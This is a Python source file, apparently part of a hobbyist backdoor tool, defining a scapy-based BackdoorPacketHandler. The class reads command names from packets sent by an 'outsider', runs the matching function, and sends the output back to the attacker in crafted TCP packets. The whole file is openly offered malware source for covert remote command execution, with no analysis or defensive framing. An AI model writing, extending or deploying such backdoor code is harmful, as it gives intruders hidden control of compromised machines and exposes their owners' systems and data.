"""
Author: R3tr0
Date: 24/11/2023
Purpose: Holds the main operation of handling the packets
"""
from scapy.all import *

import consts

class BackdoorPacketHandler:
	"""
	the main operation of the backdoor packet handling
	"""

	def __init__(self, commands_to_function: dict):
		"""
		:param: commands_to_function is a dict that holds commands that can be executed by outsider, and a reference to a function
		"""
		self.commands_to_function = commands_to_function


	def handle_packet(self, packet):
		"""
		Handles the packet sent from the outsider, and calls the function it reference
		:param: packet is the scapy sniffed packet
		:returns: packet to the outsider, if command found, then the output of the command otherwise, error
		"""
		packet_data = packet[Raw].load
		packet_data = packet_data.decode()
		command = packet_data.split(":")[0]
		try:
			data = self.commands_to_function[command](packet_data.split(":")[1])
			self.send_response(packet ,data)
		except KeyError:
			self.send_error_response(packet)


	def send_response(self, packet, data):
		"""
		sends the response for the attacker
		:param: packet is the scapy sniffed packet
		:data: the output of the command
		"""
		response_packet = IP(dst=packet[IP].src) / TCP(dport=consts.SENDING_PORT, sport=packet.dport, ack=packet[TCP].seq+1, seq=packet[TCP].ack, flags=consts.SENDING_FLAG_VALUE) / bytes(data)
		send(response_packet)


	def send_error_response(self, packet):
		"""
		sends the response for the attacker in case of error
		:param: packet is the scapy sniffed packet
		"""
		response_packet = IP(dst=packet[IP].src) / TCP(dport=consts.SENDING_PORT, sport=packet.dport, ack=packet[TCP].seq+1, seq=packet[TCP].ack, flags=consts.SENDING_FLAG_VALUE) / consts.ERR_MSG
		send(response_packet)